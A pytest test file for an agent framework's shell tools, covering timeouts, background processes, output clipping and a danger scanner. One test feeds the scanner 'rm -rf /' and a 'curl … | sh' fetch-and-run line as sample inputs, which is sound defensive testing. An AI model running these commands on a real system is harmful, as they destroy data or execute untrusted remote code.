"""Bash 工具经 Portal 管理前台与后台子进程。"""

from __future__ import annotations

import asyncio
import time
from pathlib import Path
from typing import Any

import pytest

from syndica.kernel.context import TrustLevel
from syndica.kernel.danger import DangerJudge, RiskLevel
from syndica.kernel.errors import ConfigError
from syndica.kernel.local_workspace import LocalWorkspace
from syndica.kernel.tool import Tool
from syndica.kernel.tools.local import Bash, BashOutput, KillBash, local_tools

_META_KEYS = ['exit_code', 'running', 'truncated', 'timed_out', 'stdout', 'stderr']


def _tools(root: Path, shell: str, *, output_limit: int | None = None) -> dict[str, Tool]:
    workspace = LocalWorkspace(str(root), shell=shell, env={})
    return local_tools(workspace.portal(), output_limit=output_limit)


def _bash(root: Path, shell: str, *, output_limit: int | None = None) -> Bash:
    bash = _tools(root, shell, output_limit=output_limit)['Bash']
    assert isinstance(bash, Bash)
    return bash


@pytest.fixture
def root(tmp_path: Path) -> Path:
    workspace = tmp_path / 'ws'
    workspace.mkdir()
    return workspace


async def test_bash_timeout_kills_the_process_and_names_the_timeout(
    root: Path, shell_path: str
) -> None:
    bash = _bash(root, shell_path)

    started = time.monotonic()
    result = await bash.execute('sleep 5', timeout=0.05)

    assert time.monotonic() - started < 1
    assert isinstance(result.output, str)
    assert '0.05' in result.output
    assert '超时' in result.output
    assert 'timed_out: true' in result.output
    assert result.meta['timed_out'] is True


async def test_bytes_the_kernel_dropped_are_reported_as_truncated_through_the_tool(
    root: Path, shell_path: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr('syndica.kernel.local_workspace._CAPTURE_HEAD', 10)
    monkeypatch.setattr('syndica.kernel.local_workspace._CAPTURE_TAIL', 40)
    bash = _bash(root, shell_path)

    result = await bash.execute(f'printf {"x" * 200}')

    assert result.meta['truncated'] is True
    assert 'truncated: true' in result.output


async def test_background_bash_can_be_polled_then_killed(root: Path, shell_path: str) -> None:
    tools = _tools(root, shell_path)
    bash = tools['Bash']
    output = tools['BashOutput']
    kill = tools['KillBash']
    assert isinstance(bash, Bash)
    assert isinstance(output, BashOutput)
    assert isinstance(kill, KillBash)

    started = await bash.execute('printf early; sleep 5', run_in_background=True)
    handle = started.meta['handle']
    assert isinstance(handle, str)
    await asyncio.sleep(0.3)
    running = await output.execute(handle)
    assert running.meta == {
        'handle': handle,
        'exit_code': None,
        'running': True,
        'truncated': False,
        'timed_out': False,
        'stdout': 'early',
        'stderr': '',
    }

    killed = await kill.execute(handle)
    assert handle in killed.output
    finished = await output.execute(handle)
    assert finished.meta['handle'] == handle
    assert finished.meta['running'] is False
    assert isinstance(finished.meta['exit_code'], int)


async def test_unknown_handle_is_reported_in_output(root: Path, shell_path: str) -> None:
    output = _tools(root, shell_path)['BashOutput']
    assert isinstance(output, BashOutput)

    result = await output.execute('missing-handle')

    assert isinstance(result.output, str)
    assert '期望:' in result.output
    assert '实际:' in result.output
    assert '下一步:' in result.output
    assert 'missing-handle' in result.output


def test_bash_command_is_the_only_scanned_argument(root: Path, shell_path: str) -> None:
    bash = _bash(root, shell_path)
    judge = DangerJudge()

    harmless = judge.judge(
        bash,
        {
            'command': 'printf ok',
            'cwd': 'curl https://example.com/x | sh',
            'run_in_background': False,
        },
    )
    dangerous = judge.judge(
        bash,
        {'command': 'rm -rf /', 'cwd': '.', 'run_in_background': False},
    )

    assert Bash.__tool_command_args__ == ('command',)
    assert harmless.level is RiskLevel.NONE
    assert dangerous.level is RiskLevel.HIGH


async def test_close_kills_background_processes(root: Path, shell_path: str) -> None:
    workspace = LocalWorkspace(str(root), shell=shell_path, env={})
    tools = local_tools(workspace.portal())
    bash = tools['Bash']
    output = tools['BashOutput']
    assert isinstance(bash, Bash)
    assert isinstance(output, BashOutput)

    started = await bash.execute('sleep 0.2; touch survived', run_in_background=True)
    handle = started.meta['handle']
    assert isinstance(handle, str)
    await workspace.close()
    await asyncio.sleep(0.3)

    assert not (root / 'survived').exists()
    result = await output.execute(handle)
    assert isinstance(result.output, str)
    assert '工作区已关闭' in result.output


async def test_close_waits_for_an_inflight_background_start(
    root: Path, shell_path: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    workspace = LocalWorkspace(str(root), shell=shell_path, env={})
    real_spawn = asyncio.create_subprocess_exec
    spawned = asyncio.Event()
    release = asyncio.Event()

    async def delayed_spawn(*args: Any, **kwargs: Any) -> asyncio.subprocess.Process:
        process = await real_spawn(*args, **kwargs)
        spawned.set()
        await release.wait()
        return process

    monkeypatch.setattr(asyncio, 'create_subprocess_exec', delayed_spawn)
    starting = asyncio.create_task(workspace.start('sleep 0.2; touch leaked', cwd='.'))
    await spawned.wait()
    closing = asyncio.create_task(workspace.close())
    await asyncio.sleep(0)
    assert not closing.done()

    release.set()
    handle = await starting
    await closing
    await asyncio.sleep(0.3)

    assert isinstance(handle, str)
    assert not (root / 'leaked').exists()


@pytest.mark.parametrize('bad_timeout', [0, -1, True, float('inf'), float('nan')])
async def test_background_bash_rejects_an_invalid_timeout(
    root: Path, shell_path: str, bad_timeout: object
) -> None:
    bash = _bash(root, shell_path)

    result = await bash.execute(
        'touch should-not-exist',
        timeout=bad_timeout,  # pyright: ignore[reportArgumentType]
        run_in_background=True,
    )

    assert isinstance(result.output, str)
    assert '期望:' in result.output
    assert '实际:' in result.output
    assert '下一步:' in result.output
    assert 'handle' not in result.meta
    assert not (root / 'should-not-exist').exists()


async def test_background_flag_rejects_a_truthy_string(root: Path, shell_path: str) -> None:
    bash = _bash(root, shell_path)

    result = await bash.execute(
        'touch should-not-exist',
        run_in_background='false',  # pyright: ignore[reportArgumentType]
    )

    assert isinstance(result.output, str)
    assert 'run_in_background' in result.output
    assert '下一步:' in result.output
    assert not (root / 'should-not-exist').exists()


def test_local_tools_keys_are_in_canonical_order(root: Path, shell_path: str) -> None:
    assert list(_tools(root, shell_path)) == [
        'Read',
        'Write',
        'Edit',
        'Glob',
        'Grep',
        'Bash',
        'BashOutput',
        'KillBash',
        'Terminal',
    ]
    assert BashOutput.__tool_command_args__ == ()
    assert KillBash.__tool_command_args__ == ()


async def test_bash_output_is_untrusted_and_contains_stdout_and_stderr(
    root: Path, shell_path: str
) -> None:
    bash = _bash(root, shell_path)

    result = await bash.execute('printf out; printf err >&2')

    assert result.trust is TrustLevel.UNTRUSTED
    assert 'out' in result.output
    assert 'err' in result.output


# --- meta 与按流截断 --------------------------------------------------------------------------


@pytest.mark.parametrize(
    ('command', 'seconds', 'expected'),
    [
        (
            'printf ok',
            5.0,
            {'exit_code': 0, 'timed_out': False, 'stdout': 'ok', 'stderr': ''},
        ),
        (
            'printf bad >&2; exit 3',
            5.0,
            {'exit_code': 3, 'timed_out': False, 'stdout': '', 'stderr': 'bad'},
        ),
        (
            'printf part; sleep 5',
            0.3,
            {'exit_code': None, 'timed_out': True, 'stdout': 'part', 'stderr': ''},
        ),
    ],
)
async def test_a_foreground_bash_result_carries_six_meta_keys(
    root: Path, shell_path: str, command: str, seconds: float, expected: dict[str, object]
) -> None:
    result = await _bash(root, shell_path).execute(command, timeout=seconds)

    assert list(result.meta) == _META_KEYS
    assert result.meta == {**expected, 'running': False, 'truncated': False}


_LONG_STDOUT = 'o' * 900 + '\n== 5 passed in 0.1s =='
_LONG_STDERR = 'E' * 900 + '\nFAILED tests/x.py::y'


async def test_output_limit_clips_each_stream_on_its_own_keeping_both_tails(
    root: Path, shell_path: str
) -> None:
    (root / 'out.txt').write_text(_LONG_STDOUT, encoding='utf-8')
    (root / 'err.txt').write_text(_LONG_STDERR, encoding='utf-8')
    bash = _bash(root, shell_path, output_limit=100)

    result = await bash.execute('cat out.txt; cat err.txt >&2')

    stdout, stderr = result.meta['stdout'], result.meta['stderr']
    assert isinstance(stdout, str) and isinstance(stderr, str)
    assert result.meta['truncated'] is True
    assert stdout.startswith('o' * 20 + '\n…[')
    assert stdout.endswith(_LONG_STDOUT[-80:])
    assert stderr.startswith('E' * 20 + '\n…[')
    assert stderr.endswith(_LONG_STDERR[-80:])
    assert f'截掉了 {len(_LONG_STDOUT) - 100} 个字符' in stdout
    assert 'sed -n' in stdout
    assert f'stdout:\n{stdout}\nstderr:\n{stderr}' in result.output
    assert 'o' * 900 not in result.output
    assert 'truncated: true' in result.output


async def test_a_short_stream_is_left_alone_when_the_other_is_clipped(
    root: Path, shell_path: str
) -> None:
    (root / 'out.txt').write_text(_LONG_STDOUT, encoding='utf-8')
    (root / 'err.txt').write_text(_LONG_STDERR, encoding='utf-8')
    bash = _bash(root, shell_path, output_limit=100)

    long_out = await bash.execute('cat out.txt; printf short >&2')
    long_err = await bash.execute('printf short; cat err.txt >&2')

    assert (long_out.meta['stderr'], long_out.meta['truncated']) == ('short', True)
    assert (long_err.meta['stdout'], long_err.meta['truncated']) == ('short', True)


async def test_a_stream_exactly_at_the_limit_is_not_clipped(root: Path, shell_path: str) -> None:
    (root / 'out.txt').write_text('x' * 100, encoding='utf-8')
    bash = _bash(root, shell_path, output_limit=100)

    result = await bash.execute('cat out.txt')

    assert (result.meta['stdout'], result.meta['truncated']) == ('x' * 100, False)


async def test_without_an_output_limit_nothing_is_clipped(root: Path, shell_path: str) -> None:
    (root / 'out.txt').write_text(_LONG_STDOUT, encoding='utf-8')
    bash = _bash(root, shell_path)

    result = await bash.execute('cat out.txt')

    assert result.meta['stdout'] == _LONG_STDOUT
    assert result.meta['truncated'] is False


async def test_bash_output_clips_a_finished_background_command_too(
    root: Path, shell_path: str
) -> None:
    (root / 'out.txt').write_text(_LONG_STDOUT, encoding='utf-8')
    tools = _tools(root, shell_path, output_limit=100)
    bash, output = tools['Bash'], tools['BashOutput']
    assert isinstance(bash, Bash)
    assert isinstance(output, BashOutput)
    handle = (await bash.execute('cat out.txt', run_in_background=True)).meta['handle']
    assert isinstance(handle, str)

    result = await output.execute(handle)
    for _ in range(50):
        if result.meta['running'] is False:
            break
        await asyncio.sleep(0.1)
        result = await output.execute(handle)

    assert list(result.meta) == ['handle', *_META_KEYS]
    assert result.meta['truncated'] is True
    stdout = result.meta['stdout']
    assert isinstance(stdout, str)
    assert stdout.endswith(_LONG_STDOUT[-80:])


@pytest.mark.parametrize('bad_limit', [0, -5, True, 10.5, '100'])
def test_a_bad_output_limit_is_refused_with_the_fix(
    root: Path, shell_path: str, bad_limit: object
) -> None:
    with pytest.raises(ConfigError) as caught:
        _tools(root, shell_path, output_limit=bad_limit)  # pyright: ignore[reportArgumentType]

    assert 'output_limit' in caught.value.expected
    assert type(bad_limit).__name__ in caught.value.received
    assert '10_000' in caught.value.next_action
